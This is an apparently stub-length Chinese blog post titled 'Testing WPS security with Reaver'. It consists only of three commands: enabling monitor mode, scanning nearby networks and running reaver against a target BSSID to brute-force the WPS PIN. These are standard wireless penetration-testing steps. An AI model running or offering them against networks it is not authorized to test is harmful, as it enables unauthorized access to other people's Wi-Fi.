title: 通过 Reaver 测试 WPS 安全性
date: 2015-07-01 20:14:17
tags: [信息技术,开源,Reaver,WPS,安全]
categories: 信息技术
toc: true
---

```sh
airmon-ng start wlan0
airodump-ng wlan0
reaver -i moninterface -b bssid -vv
```
<!-- more -->